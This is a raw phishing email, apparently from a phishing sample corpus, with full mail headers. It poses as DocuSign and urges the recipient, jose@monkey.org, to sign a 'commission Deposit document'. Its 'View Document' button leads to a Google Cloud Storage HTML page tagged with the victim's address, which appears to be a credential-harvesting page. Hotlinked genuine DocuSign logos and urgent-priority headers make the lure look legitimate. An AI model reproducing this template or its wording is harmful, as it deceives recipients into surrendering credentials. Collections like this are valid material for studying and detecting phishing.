@@ -1,0 +1,147 @@
+Return-Path: Docu@beach.ocn.ne.jp
+Delivered-To: jose@monkey.org
+X-FDA: 84227523828.19.18526B6
+Received: from ocn-bld-mts-201c1.ocn.ad.jp (ocn-bld-mts-201c1.ocn.ad.jp [210.163.239.68])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id 71143180002
+	for <jose@monkey.org>; Wed, 17 Dec 2025 03:25:52 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=pass header.d=beach.ocn.ne.jp header.s=20240118 header.b=AX5wxrDb;
+	dmarc=pass (policy=none) header.from=beach.ocn.ne.jp;
+	spf=pass (imf30.b.hostedemail.com: domain of Docu@beach.ocn.ne.jp designates 210.163.239.68 as permitted sender) smtp.mailfrom=Docu@beach.ocn.ne.jp
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1765941952; a=rsa-sha256;
+	cv=none;
+	b=KJ2+l4O7o+xnhhdByI4/3ixtv7iaPuo8BwpfYKT6gGw2jhbyeSfq5fb8AImAYwb+N+qllm
+	EYqHBitLfjad4l9k43Oyq8A7xC5uvm0pUPcA9MnX7I+vf7sNSTTLnDwLBcypOm0AKlVGiF
+	UHvK+L5lH2ehWFUmb5T4coaZoW/yNVk=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=pass header.d=beach.ocn.ne.jp header.s=20240118 header.b=AX5wxrDb;
+	dmarc=pass (policy=none) header.from=beach.ocn.ne.jp;
+	spf=pass (imf30.b.hostedemail.com: domain of Docu@beach.ocn.ne.jp designates 210.163.239.68 as permitted sender) smtp.mailfrom=Docu@beach.ocn.ne.jp
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1765941952;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=FAmr9pVmPpUcHZSdt0zxoK8iUQwwMlH3Y674su2EK+0=;
+	b=fWO+IFAsj1gDlWtFXncgfw9Ek2iZLBXYJAPFo2vzJuJx16YoEkL2Os1srwnDOsLJysFyR8
+	HbUzLHF1tbImlRFLbu6tH+Qlod9opLsNzI4hm3XHTkyHJn53fTAM5ZlBc9XJ4WTZN7mleH
+	wDIT6AwvGB754jgdwWAQ2oOrL3S4BLA=
+Received: from mf-smf-unw002c1.ocn.ad.jp (mf-smf-unw002c1.ocn.ad.jp [153.138.219.69])
+	by ocn-bld-mts-201c1.ocn.ad.jp (Postfix) with ESMTP id A05B87C000568
+	for <jose@monkey.org>; Wed, 17 Dec 2025 12:25:50 +0900 (JST)
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=beach.ocn.ne.jp;
+	s=20240118; t=1765941950;
+	bh=BR+myqCs74svWA1Jkpmse5RmotxY2CcdYRGcRew0jP4=;
+	h=From:Subject:To:Date:From;
+	b=AX5wxrDbk4SMBFQyaAOINoOxQ0KFvMrWdNyDtbn5jObsUqkRzP2CrJ9WweK7vw2X0
+	 fXQAaWrael/Aw53QCWoRXEyF5oI6Cgq0MHPnhOnVjgOrQEzokRE5XQkwPvjK4VTs4R
+	 9oI6XFP/52BUpu1JvKd8WsmV7ErfV2p6WkaYokbmk79jb/QDWkaPnNztujmnBHy1H6
+	 o1uoyn7sXGUbM7wvApqD7a6Jg36xNerqdVhAmIvjb6GjMxbBOzh7wYvTDSeEiBz/yX
+	 Ie1aZNY+z8ANuciwp2+E2BAXA/N2iHRQBAyqaecZWGGvGNWpsn0gozy8zOHT5u1VmD
+	 Sl3aZA/9hparQ==
+Received: from ocn-vc-mts-212c1.ocn.ad.jp ([210.145.250.236])
+	by mf-smf-unw002c1.ocn.ad.jp with ESMTP
+	id Vi7Ev6wkCiIHHViAgvmrwq; Wed, 17 Dec 2025 12:25:50 +0900
+Received: from ocn-sdpx-mts-202c1.ocn.ad.jp ([210.145.249.135])
+ by ocn-vc-mts-212c1 with ngmta
+ id e05b4946-1881e2d90164501b; Wed, 17 Dec 2025 12:25:50 +0900
+Received: from EC2AMAZ-BHS5BE8 (ec2-43-206-233-55.ap-northeast-1.compute.amazonaws.com [43.206.233.55])
+	by ocn-sdpx-mts-202c1.ocn.ad.jp (Postfix) with ESMTPA
+	for <jose@monkey.org>; Wed, 17 Dec 2025 12:25:50 +0900 (JST)
+From: "DocuSign for Monkey" <Docu@beach.ocn.ne.jp>
+Subject: Deposit Arrangement Document Now Available
+To: <jose@monkey.org>
+Content-Type: multipart/alternative; boundary="0cHzn7IYdAdmipXGA49KerW43t=_R5qhsA"
+MIME-Version: 1.0
+Date: Wed, 17 Dec 2025 14:25:50 +1100
+Priority: urgent
+X-Priority: 1
+Importance: high
+Message-Id: <17502025122514229D0B35C6$ED37377A61@beach.ocn.ne.jp>
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 71143180002
+X-Stat-Signature: 3tigqd1kxw9dysdcurzxdwuys48pj6g9
+X-Spam-Status: No, score=7.30
+X-Rspam-User: 
+X-HE-Tag: 1765941952-552830
+X-HE-Meta: U2FsdGVkX18gXZumqoi9q/2ObGQn+7A17+c6RCq12UlXWhUkrO1U/HVI1w9jRRtIu4IBJq7W89FBlHr3YI2pkRX9xTc2Rrk6J6UcjYBchXfZweKmKh/cyaAkfw6/GzicPB2Cy3Q+q+CVPibkqe4aENcB6Ej+kvWAcbdyPUr5+9OB9mLJxT1JTC9MgxhnRTgmYTESv9wEvAHOegrd7ZGbi3Jt+B4xG6tLKW448stqbC7w4XCm/Eyue3zou8njK4DKuy56RFn6XBs5mdVp9r5woeRDTvreIRTmKrEP/1H4sboHmLJxetG9NnNOYKSU6G1PA5eFZn06pfy3h2Lb/BiEQ7AUGRGg7oM0B0bqWgv7SJwFrKFl39GCB8H3gGb/Gf4nTvueYivLraRuzdbWkS4YRKCht6ySfBaHyWhR2wh6v0X8Q+lHjx8yvOZZnsJeaHJklJ4bOrcMMY1w9ga/xCincdbTA4A8MQcwvD4n1mNmoQwMEnhzlgmdPc3wmFnT7coiVoV0df/NcCwRTxklTxeyYme5lm+uRCbnE/3GerW4KL7i0pvKP3QbtHcKu9yI2bstIbmdGiXQE8KVrlnLrAAyUkZEJixddG2aM7NG0DJapJkRfMgIzIg78lmawCjR8G3Aq/Lhdj2nq9VhQSYPSeTjaMXX++HlU2Dk3YWEPt5ix+XDU+90A37/FvQOnV0UZ2OkRaolSIp1EOKulBaAk9JEuhrP4Q3G5fv7frOHD7Z4743xI5eoynPwy3ghDVJRtTmYuaHKSCAGoBQnzjYL127NXalrxrJz0aV7ujlM3QDu+ZZQjceBcgjlYn5+FY+l44iqcgeY+G1ktBYSSyEzWhFJl1q67dpheOfYQQA/fxKCjgKU7+M8ipqtdTbtvJIZIDqBp61LRURpbCAQbjDtMNhSEc3lrPHhXJDyLOBc/O1eFFuM/+yl7p4jJ+SxKAZNrQWu1d09l2lCs8L3fGV2joc+HCpqmt9
+ kptfd17mkhEt5o0htOnT+GhJfYkimSl25a8OBNzDir6wTJPUqjA/7S+hRy4UYzggJz98jdiRMxPhQlg2JBVCeQRsxv5z+laWDvYIB+lN/hgUwa08gqy/HgJA2ZY/rl2xti/lHWHakBQ8KnuWPIt0Vs4tgJtWx2a/DW/tbxclhYGrpf4BFE180jvOc19wGU6U4fcSqsHOHhvcA6CFt8+DRk44HC3WvejZAQ2cG/YVUCUq4xuggvOfCm/cWaOQkHoVV2PnhdotqhYiPQHFpTAE/+ti+phLT22A7oPNvADrZTzGvpUnqefYUO4h6HDn7gWoAH9z3WdE8cFw2urFt7r+z5VaaOCaFZ5WnIrpcIPorevqUX1RudIxAVLhH8g8OxCmn2ayqN4+BaZ8KhmTT4wNOa45iu3bZ76P3rKJB0GMrA2CXVaQBX2P1LPZx1w==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 474
+
+This is a multi-part message in MIME format
+
+--0cHzn7IYdAdmipXGA49KerW43t=_R5qhsA
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+Your commission Deposit document is now available.
+
+View Document https://storage.googleapis.com/0x816754fc8e2b5059b03340c=
+d04f0x816754fc8e2b5059/privacy-policyzs.html#jose@monkey.org
+
+Your Signature is Required. Please review and sign the document as soo=
+n as possible.
+
+Do Not Share This EmailThis email contains a secure link to DocuSign. =
+Please do not share this email, link, or access code with others.
+
+About DocuSignSign documents electronically in just minutes. It=E2=80=99=
+s safe, secure, and legally binding.
+
+Questions About the Document?For any questions, please contact the sen=
+der directly via email.
+
+--0cHzn7IYdAdmipXGA49KerW43t=_R5qhsA
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html lang=3Den><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
+8">
+  <META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0"> <STYLE> body { margin: 0; padding: 0; background-color: #f4f4=
+f4; font-family: Arial, Helvetica, sans-serif; color: #333333; } .cont=
+ainer { max-width: 640px; margin: 0 auto; background-color: #ffffff; b=
+order-radius: 8px; overflow: hidden; box-shadow: 0 2px 6px rgba(0, 0, =
+0, 0.1); } .header { padding: 20px 24px 0; text-align: left; } .header=
+ img { width: 116px; } .banner { background-color: #1e4ca1; color: #ff=
+ffff; text-align: center; padding: 36px 20px 40px; } .banner img { mar=
+gin: 0 auto 20px; display: block; } .banner p { font-size: 18px; margi=
+n: 0 0 20px; } .button { display: inline-block; background-color: #fff=
+fff; color: #1e4ca1; text-decoration: none; padding: 12px 24px; font-w=
+eight: bold; border-radius: 4px; font-size: 14px; border: none; } .con=
+tent { padding: 24px; font-size: 16px; } .content p { margin: 0; } .fo=
+oter { background-color: #f0f0f0; padding: 24px; font-size: 13px; colo=
+r: #666666; line-height: 1.6; } .footer strong { display: block; margi=
+n-bottom: 6px; color: #333333; } a.button:hover { background-color: #d=
+fe9ff; } </STYLE> <title>Deposit Arrangement Document Now Available</t=
+itle>
+ </head>
+ <body> <DIV class=3Dcontainer><!-- Header --> <DIV class=3Dheader><IM=
+G alt=3D"DocuSign Logo" src=3D"https://www.docusign.net/Signing/Images=
+/email/Email_Logo.png"> </DIV><!-- Banner --> <DIV class=3Dbanner><IMG=
+ alt=3D"Document Complete Icon" src=3D"https://www.docusign.net/member=
+/Images/email/docComplete-white.png" width=3D75 height=3D75> <P>Your c=
+ommission Deposit document is now available.</P><A class=3Dbutton href=
+=3D"https://storage.googleapis.com/0x816754fc8e2b5059b03340cd04f0x8167=
+54fc8e2b5059/privacy-policyzs.html#jose@monkey.org" rel=3D"noopener no=
+referrer" target=3D_blank>View Document</A> </DIV><!-- Content --> <DI=
+V class=3Dcontent> <P><STRONG>Your Signature is Required.</STRONG> Ple=
+ase review and sign the document as soon as possible.</P></DIV><!-- Fo=
+oter --> <DIV class=3Dfooter> <P><STRONG>Do Not Share This Email</STRO=
+NG>This email contains a secure link to DocuSign. Please do not share =
+this email, link, or access code with others.</p><p><STRONG>About Docu=
+Sign</STRONG>Sign documents electronically in just minutes. It=E2=80=99=
+s safe, secure, and legally binding.</p><p><STRONG>Questions About the=
+ Document?</STRONG>For any questions, please contact the sender direct=
+ly via email.</P></DIV></DIV></body>
+ </html>
+
+--0cHzn7IYdAdmipXGA49KerW43t=_R5qhsA--
+
